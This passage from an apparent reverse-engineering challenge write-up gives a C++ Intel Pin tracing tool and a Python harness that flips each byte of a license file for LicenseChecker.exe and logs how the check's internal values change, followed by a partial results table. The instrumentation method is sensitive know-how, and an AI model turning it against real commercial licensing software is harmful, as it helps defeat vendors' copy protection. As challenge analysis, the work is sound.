class="comment">/*v*/</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (g_callsite != <span class="number">0</span> &amp;&amp; <span class="built_in">INS_Address</span>(ins) == g_callsite) &#123;</span><br><span class="line">        <span class="built_in">INS_InsertCall</span>(ins, IPOINT_BEFORE, (AFUNPTR)EnterShellcode, IARG_THREAD_ID, IARG_REG_VALUE, REG_RSI, IARG_INST_PTR, IARG_END);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">INS_IsValidForIpointAfter</span>(ins)) &#123;</span><br><span class="line">            <span class="built_in">INS_InsertCall</span>(ins, IPOINT_AFTER, (AFUNPTR)ExitShellcode, IARG_THREAD_ID, IARG_END);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">INS_InsertIfCall</span>(ins, IPOINT_BEFORE, (AFUNPTR)ShouldLog, IARG_THREAD_ID, IARG_INST_PTR, IARG_END);</span><br><span class="line">    <span class="built_in">INS_InsertThenCall</span>(ins, IPOINT_BEFORE, (AFUNPTR)LogRegs, IARG_THREAD_ID, IARG_REG_VALUE, REG_RAX, IARG_REG_VALUE, REG_RCX, IARG_END);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> VOID <span class="title">Fini</span><span class="params">(INT32 <span class="comment">/*code*/</span>, VOID* <span class="comment">/*v*/</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (g_fp) std::<span class="built_in">fclose</span>(g_fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">PIN_InitSymbols</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">PIN_Init</span>(argc, argv)) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    g_tls = <span class="built_in">PIN_CreateThreadDataKey</span>(<span class="literal">nullptr</span>);</span><br><span class="line">    <span class="built_in">PIN_InitLock</span>(&amp;g_lock);</span><br><span class="line">    g_fp = std::<span class="built_in">fopen</span>(KnobOut.<span class="built_in">Value</span>().<span class="built_in">c_str</span>(), <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!g_fp) <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    std::<span class="built_in">fprintf</span>(g_fp, <span class="string">&quot;===== MatryTrace start =====\n&quot;</span>);</span><br><span class="line">    std::<span class="built_in">fprintf</span>(g_fp, <span class="string">&quot;out=%s, call_rva=0x%llX\n&quot;</span>, KnobOut.<span class="built_in">Value</span>().<span class="built_in">c_str</span>(), (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)KnobCallRva.<span class="built_in">Value</span>());</span><br><span class="line">    std::<span class="built_in">fflush</span>(g_fp);</span><br><span class="line">    <span class="built_in">IMG_AddInstrumentFunction</span>(ImageLoad, <span class="literal">nullptr</span>);</span><br><span class="line">    <span class="built_in">INS_AddInstrumentFunction</span>(Instruction, <span class="literal">nullptr</span>);</span><br><span class="line">    <span class="built_in">PIN_AddThreadStartFunction</span>(ThreadStart, <span class="literal">nullptr</span>);</span><br><span class="line">    <span class="built_in">PIN_AddThreadFiniFunction</span>(ThreadFini, <span class="literal">nullptr</span>);</span><br><span class="line">    <span class="built_in">PIN_AddFiniFunction</span>(Fini, <span class="literal">nullptr</span>);</span><br><span class="line">    <span class="built_in">PIN_StartProgram</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>From the output log, we can see that the two int64 <code>0xEFB1957A03BAECF7, 0x8C982983781BCDB6</code> continuously appearing throughout the entire log. And every int64 input turns to a new int64 after the process, abbreviate them as Res0~Res3. In the end, after Res3 is generated, Res0 appears again and finally an int64 is produced, the value of this int64 is Res0 &gt;&gt; 1. Try to modify every byte of the license and observe the resulting changes:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> dataclasses <span class="keyword">import</span> dataclass</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Optional</span>, <span class="type">Tuple</span>, <span class="type">Dict</span>, <span class="type">List</span></span><br><span class="line"></span><br><span class="line">RX = re.<span class="built_in">compile</span>(<span class="string">r&#x27;^(rax|rcx)\s*=\s*0x([0-9a-fA-F]+)\s*$&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@dataclass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entry</span>:</span><br><span class="line">    value: <span class="built_in">int</span></span><br><span class="line">    lineno: <span class="built_in">int</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_log_values</span>(<span class="params">path: <span class="built_in">str</span>, min_digits: <span class="built_in">int</span> = <span class="number">15</span></span>) -&gt; <span class="type">List</span>[Entry]:</span><br><span class="line">    out: <span class="type">List</span>[Entry] = []</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i, line <span class="keyword">in</span> <span class="built_in">enumerate</span>(f, <span class="number">1</span>):</span><br><span class="line">            s = line.strip()</span><br><span class="line">            m = RX.<span class="keyword">match</span>(s)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> m: <span class="keyword">continue</span></span><br><span class="line">            hexstr = m.group(<span class="number">2</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(hexstr) &lt; min_digits: <span class="keyword">continue</span></span><br><span class="line">            v = <span class="built_in">int</span>(hexstr, <span class="number">16</span>)</span><br><span class="line">            out.append(Entry(v, i))</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">qwords_from_32bytes</span>(<span class="params">buf32: <span class="built_in">bytes</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(buf32) == <span class="number">32</span></span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">int</span>.from_bytes(buf32[i:i+<span class="number">8</span>], <span class="string">&quot;little&quot;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">32</span>, <span class="number">8</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">first_occurrence_map</span>(<span class="params">entries: <span class="type">List</span>[Entry]</span>) -&gt; <span class="type">Dict</span>[<span class="built_in">int</span>, <span class="built_in">int</span>]:</span><br><span class="line">    first: <span class="type">Dict</span>[<span class="built_in">int</span>, <span class="built_in">int</span>] = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> e <span class="keyword">in</span> entries:</span><br><span class="line">        <span class="keyword">if</span> e.value <span class="keyword">not</span> <span class="keyword">in</span> first: first[e.value] = e.lineno</span><br><span class="line">    <span class="keyword">return</span> first</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">diff_byte_positions_le</span>(<span class="params">a: <span class="built_in">int</span>, b: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">    ba = a.to_bytes(<span class="number">8</span>, <span class="string">&quot;little&quot;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">    bb = b.to_bytes(<span class="number">8</span>, <span class="string">&quot;little&quot;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">return</span> [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>) <span class="keyword">if</span> ba[i] != bb[i]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">format_bytes_le</span>(<span class="params">x: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    b = x.to_bytes(<span class="number">8</span>, <span class="string">&quot;little&quot;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot; &quot;</span>.join(<span class="string">f&quot;<span class="subst">&#123;v:02x&#125;</span>&quot;</span> <span class="keyword">for</span> v <span class="keyword">in</span> b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_only</span>(<span class="params">entriesA, entriesB</span>):</span><br><span class="line">    setA = <span class="built_in">set</span>(e.value <span class="keyword">for</span> e <span class="keyword">in</span> entriesA)</span><br><span class="line">    setB = <span class="built_in">set</span>(e.value <span class="keyword">for</span> e <span class="keyword">in</span> entriesB)</span><br><span class="line">    <span class="keyword">return</span> setA - setB, setB - setA</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pick_earliest_from_set</span>(<span class="params">only_set, first_line, forbid_values, forbid_keys</span>):</span><br><span class="line">    best_v = <span class="literal">None</span></span><br><span class="line">    best_ln = <span class="number">10</span>**<span class="number">18</span></span><br><span class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> only_set:</span><br><span class="line">        <span class="keyword">if</span> (v &amp; <span class="number">0xffffffff</span>) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> v <span class="keyword">in</span> forbid_values:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> forbid_keys <span class="keyword">and</span> v <span class="keyword">in</span> forbid_keys:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        ln = first_line.get(v, <span class="number">10</span>**<span class="number">18</span>)</span><br><span class="line">        <span class="keyword">if</span> ln &lt; best_ln:</span><br><span class="line">            best_ln = ln</span><br><span class="line">            best_v = v</span><br><span class="line">    <span class="keyword">if</span> best_v <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> (best_v, best_ln)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_round_diff_value_set_based</span>(<span class="params">logA: <span class="built_in">str</span>, logB: <span class="built_in">str</span>, inputA_32: <span class="built_in">bytes</span>, inputB_32: <span class="built_in">bytes</span>, min_digits: <span class="built_in">int</span> = <span class="number">15</span>, forbid_keys: <span class="built_in">set</span>[<span class="built_in">int</span>] | <span class="literal">None</span> = <span class="literal">None</span></span>):</span><br><span class="line">    A = parse_log_values(logA, min_digits=min_digits)</span><br><span class="line">    B = parse_log_values(logB, min_digits=min_digits)</span><br><span class="line">    onlyA, onlyB = set_only(A, B)</span><br><span class="line">    firstA = first_occurrence_map(A)</span><br><span class="line">    firstB = first_occurrence_map(B)</span><br><span class="line">    forbid_values = <span class="built_in">set</span>(qwords_from_32bytes(inputA_32)) | <span class="built_in">set</span>(qwords_from_32bytes(inputB_32))</span><br><span class="line"></span><br><span class="line">    candA = pick_earliest_from_set(onlyA, firstA, forbid_values, forbid_keys)</span><br><span class="line">    candB = pick_earliest_from_set(onlyB, firstB, forbid_values, forbid_keys)</span><br><span class="line">    <span class="keyword">return</span> candA, candB</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Tuple</span>, <span class="type">Optional</span></span><br><span class="line"><span class="keyword">from</span> pick_round_diff <span class="keyword">import</span> find_round_diff_value_set_based, diff_byte_positions_le, format_bytes_le</span><br><span class="line"></span><br><span class="line">PIN_EXE   = <span class="string">r&quot;pin&quot;</span></span><br><span class="line">TOOL_DLL  = <span class="string">r&quot;Trace.dll&quot;</span></span><br><span class="line">TARGET_EXE= <span class="string">r&quot;LicenseChecker.exe&quot;</span></span><br><span class="line">CALL_RVA  = <span class="string">&quot;0x120B&quot;</span></span><br><span class="line"></span><br><span class="line">BASE_STR = <span class="string">b&quot;12345678901234567890123456789012&quot;</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(BASE_STR) == <span class="number">32</span></span><br><span class="line"></span><br><span class="line">WORKDIR = Path(<span class="string">&quot;.&quot;</span>).resolve()</span><br><span class="line">LICENSE_PATH = WORKDIR / <span class="string">&quot;license.bin&quot;</span></span><br><span class="line">LOG_BASE = WORKDIR / <span class="string">&quot;log_base.txt&quot;</span></span><br><span class="line">LOG_CUR  = WORKDIR / <span class="string">&quot;log.txt&quot;</span></span><br><span class="line">OUT_MAP  = WORKDIR / <span class="string">&quot;map_result.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_pin_and_collect</span>(<span class="params">log_path: Path</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">if</span> log_path.exists(): log_path.unlink()</span><br><span class="line">    cmd = [PIN_EXE, <span class="string">&quot;-t&quot;</span>, <span class="built_in">str</span>((WORKDIR / TOOL_DLL).resolve()), <span class="string">&quot;-o&quot;</span>, <span class="built_in">str</span>(log_path), <span class="string">&quot;-call_rva&quot;</span>, CALL_RVA, <span class="string">&quot;--&quot;</span>, <span class="built_in">str</span>((WORKDIR / TARGET_EXE).resolve())]</span><br><span class="line">    r = subprocess.run(cmd, cwd=<span class="built_in">str</span>(WORKDIR), stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> r.returncode != <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] pin run returncode =&quot;</span>, r.returncode)</span><br><span class="line">        <span class="keyword">if</span> r.stdout.strip(): <span class="built_in">print</span>(<span class="string">&quot;=== stdout ===\n&quot;</span>, r.stdout)</span><br><span class="line">        <span class="keyword">if</span> r.stderr.strip(): <span class="built_in">print</span>(<span class="string">&quot;=== stderr ===\n&quot;</span>, r.stderr)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> log_path.exists() <span class="keyword">or</span> log_path.stat().st_size == <span class="number">0</span>: <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;log not generated: <span class="subst">&#123;log_path&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_license</span>(<span class="params">buf32: <span class="built_in">bytes</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(buf32) == <span class="number">32</span></span><br><span class="line">    LICENSE_PATH.write_bytes(buf32)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mutate_one_byte</span>(<span class="params">base: <span class="built_in">bytes</span>, pos: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    b = <span class="built_in">bytearray</span>(base)</span><br><span class="line">    orig = b[pos]</span><br><span class="line">    b[pos] = (orig + <span class="number">1</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ensure_baseline</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">if</span> LOG_BASE.exists() <span class="keyword">and</span> LOG_BASE.stat().st_size &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] generating baseline log_base.txt ...&quot;</span>)</span><br><span class="line">    write_license(BASE_STR)</span><br><span class="line">    run_pin_and_collect(LOG_BASE)</span><br><span class="line"></span><br><span class="line">FORBID_KEYS = &#123;<span class="number">0xEFB1957A03BAECF7</span>, <span class="number">0x8C982983781BCDB6</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">analyze_pair</span>(<span class="params">base32: <span class="built_in">bytes</span>, cur32: <span class="built_in">bytes</span></span>) -&gt; <span class="type">Tuple</span>[<span class="type">Optional</span>[<span class="built_in">int</span>], <span class="type">Optional</span>[<span class="built_in">int</span>], <span class="built_in">list</span>[<span class="built_in">int</span>]]:</span><br><span class="line">    candA, candB = find_round_diff_value_set_based(</span><br><span class="line">        <span class="built_in">str</span>(LOG_BASE), <span class="built_in">str</span>(LOG_CUR),</span><br><span class="line">        inputA_32=base32,</span><br><span class="line">        inputB_32=cur32,</span><br><span class="line">        min_digits=<span class="number">15</span>,</span><br><span class="line">        forbid_keys=FORBID_KEYS,</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">if</span> candA <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> candB <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span>, []</span><br><span class="line">    valA, lineA = candA</span><br><span class="line">    valB, lineB = candB</span><br><span class="line">    changed = diff_byte_positions_le(valA, valB)</span><br><span class="line">    <span class="keyword">return</span> valA, valB, changed</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    ensure_baseline()</span><br><span class="line"></span><br><span class="line">    lines = []</span><br><span class="line">    lines.append(<span class="string">&quot;Base = &quot;</span> + BASE_STR.decode(<span class="string">&quot;ascii&quot;</span>, <span class="string">&quot;ignore&quot;</span>))</span><br><span class="line">    lines.append(<span class="string">&quot;Rule: pick unique (multiset extra), low32!=0, not plaintext qwords; if multiple, earliest line.\n&quot;</span>)</span><br><span class="line">    lines.append(<span class="string">&quot;Output: block_idx byte_idx (within block) =&gt; changed bytes in round-diff qword (little-endian idx 0..7)\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> off <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            pos = block * <span class="number">8</span> + off</span><br><span class="line">            cur = mutate_one_byte(BASE_STR, pos)</span><br><span class="line">            write_license(cur)</span><br><span class="line">            run_pin_and_collect(LOG_CUR)</span><br><span class="line">            valA, valB, changed = analyze_pair(BASE_STR, cur)</span><br><span class="line">            orig_ch = BASE_STR[pos]</span><br><span class="line">            new_ch  = cur[pos]</span><br><span class="line">            <span class="keyword">if</span> valA <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> valB <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                lines.append(<span class="string">f&quot;[block<span class="subst">&#123;block&#125;</span> byte<span class="subst">&#123;off&#125;</span> pos<span class="subst">&#123;pos:02d&#125;</span>] <span class="subst">&#123;orig_ch:02x&#125;</span>-&gt;<span class="subst">&#123;new_ch:02x&#125;</span>  !! no candidate found&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            lines.append(</span><br><span class="line">                <span class="string">f&quot;[block<span class="subst">&#123;block&#125;</span> byte<span class="subst">&#123;off&#125;</span> pos<span class="subst">&#123;pos:02d&#125;</span>] <span class="subst">&#123;orig_ch:02x&#125;</span>-&gt;<span class="subst">&#123;new_ch:02x&#125;</span>  &quot;</span></span><br><span class="line">                <span class="string">f&quot;diff_qword: A=0x<span class="subst">&#123;valA:016x&#125;</span> (le:<span class="subst">&#123;format_bytes_le(valA)&#125;</span>)  &quot;</span></span><br><span class="line">                <span class="string">f&quot;B=0x<span class="subst">&#123;valB:016x&#125;</span> (le:<span class="subst">&#123;format_bytes_le(valB)&#125;</span>)  &quot;</span></span><br><span class="line">                <span class="string">f&quot;changed_le_idx=<span class="subst">&#123;changed&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    OUT_MAP.write_text(<span class="string">&quot;\n&quot;</span>.join(lines), encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] wrote:&quot;</span>, OUT_MAP)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>The output:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">[block0 byte0 pos00] 31-&gt;32 A=0x56f01199de97c803 B=0x50f01199de98cb33 changed_le_idx=[0, 1, 2, 7]</span><br><span class="line">[block0 byte1 pos01] 32-&gt;33 A=0x56f01199de97c803 B=0x56f0119bdb96d803 changed_le_idx=[1, 2, 3, 4]</span><br><span class="line">[block0 byte2 pos02] 33-&gt;34 A=0x56f01199de97c803 B=0x56f01f99d9e7c818 changed_le_idx=[0, 2, 3, 5]</span><br><span class="line">[block0 byte3 pos03] 34-&gt;35 A=0x56f01199de97c803 B=0x56f21199ce97cd02 changed_le_idx=[0, 1, 3, 6]</span><br><span class="line">[block0 byte4 pos04] 35-&gt;36 A=0x56f01199de97c803 B=0x56ff12aad897c803 changed_le_idx=[3, 4, 5, 6]</span><br><span class="line">[block0 byte5 pos05] 36-&gt;37 A=0x56f01199de97c803 B=0x53f10099de97c801 changed_le_idx=[0, 5, 6, 7]</span><br><span class="line">[block0 byte6 pos06] 37-&gt;38 A=0x56f01199de97c803 B=0x590f11aade97d603 changed_le_idx=[1, 4, 6, 7]</span><br><span class="line">[block0 byte7 pos07] 38-&gt;39 A=0x56f01199de97c803 B=0x47f01498de95c803 changed_le_idx=[2, 4, 5, 7]</span><br><span class="line"></span><br><span class="line">[block1 byte0 pos08] 39-&gt;3a A=0xa0c207ffba81fa8b B=0xa6c207ffba8ef9bb changed_le_idx=[0, 1, 2, 7]</span><br><span class="line">[block1 byte1 pos09] 30-&gt;31 A=0xa0c207ffba81fa8b B=0xa0c207fdbf80ea8b changed_le_idx=[1, 2, 3, 4]</span><br><span class="line">[block1 byte2 pos10] 31-&gt;32 A=0xa0c207ffba81fa8b B=0xa0c201ffb9b1fa84 changed_le_idx=[0, 2, 3, 5]</span><br><span class="line">[block1 byte3 pos11] 32-&gt;33 A=0xa0c207ffba81fa8b B=0xa0c007ffaa81ff8a changed_le_idx=[0, 1, 3, 6]</span><br><span class="line">[block1 byte4 pos12] 33-&gt;34 A=0xa0c207ffba81fa8b B=0xa0d90088b481fa8b changed_le_idx=[3, 4, 5, 6]</span><br><span class="line">[block1 byte5 pos13] 34-&gt;35 A=0xa0c207ffba81fa8b B=0xa5c316ffba81fa89 changed_le_idx=[0, 5, 6, 7]</span><br><span class="line">[block1 byte6 pos14] 35-&gt;36 A=0xa0c207ffba81fa8b B=0xa3f107f0ba81fc8b changed_le_idx=[1, 4, 6, 7]</span><br><span class="line">[block1 byte7 pos15] 36-&gt;37 A=0xa0c207ffba81fa8b B=0xb1c202feba83fa8b changed_le_idx=[2, 4, 5, 7]</span><br><span class="line"></span><br><span class="line">[block2 byte0 pos16] 37-&gt;38 A=0x86ac79d1be3b724d B=0x98ac79d1be087dbd changed_le_idx=[0, 1, 2, 7]</span><br><span class="line">[block2 byte1 pos17] 38-&gt;39 A=0x86ac79d1be3b724d B=0x86ac79d3bb3a624d changed_le_idx=[1, 2, 3, 4]</span><br><span class="line">[block2 byte2 pos18] 39-&gt;3a A=0x86ac79d1be3b724d B=0x86ac7fd1bd0b7242 changed_le_idx=[0, 2, 3, 5]</span><br><span class="line">[block2 byte3 pos19] 30-&gt;31 A=0x86ac79d1be3b724d B=0x86ae79d1ae3b774c changed_le_idx=[0, 1, 3, 6]</span><br><span class="line">[block2 byte4 pos20] 31-&gt;32 A=0x86ac79d1be3b724d B=0x86a37ae2b83b724d changed_le_idx=[3, 4, 5, 6]</span><br><span class="line">[block2 byte5 pos21] 32-&gt;33 A=0x86ac79d1be3b724d B=0x83ad68d1be3b724f changed_le_idx=[0, 5, 6, 7]</span><br><span class="line">[block2 byte6 pos22] 33-&gt;34 A=0x86ac79d1be3b724d B=0x81db79cabe3b7c4d changed_le_idx=[1, 4, 6, 7]</span><br><span class="line">[block2 byte7 pos23] 34-&gt;35 A=0x86ac79d1be3b724d B=0x97ac7cd0be39724d changed_le_idx=[2, 4, 5, 7]</span><br><span class="line"></span><br><span class="line">[block3 byte0 pos24] 35-&gt;36 A=0xecb4514916d3bc57 B=0xeab4514916dcbf67 changed_le_idx=[0, 1, 2, 7]</span><br><span class="line">[block3 byte1 pos25] 36-&gt;37 A=0xecb4514916d3bc57 B=0xecb4514b13d2ac57 changed_le_idx=[1, 2, 3, 4]</span><br><span class="line">[block3 byte2 pos26] 37-&gt;38 A=0xecb4514916d3bc57 B=0xecb44f491923bc64 changed_le_idx=[0, 2, 3, 5]</span><br><span class="line">[block3 byte3 pos27] 38-&gt;39 A=0xecb4514916d3bc57 B=0xecb6514906d3b956 changed_le_idx=[0, 1, 3, 6]</span><br><span 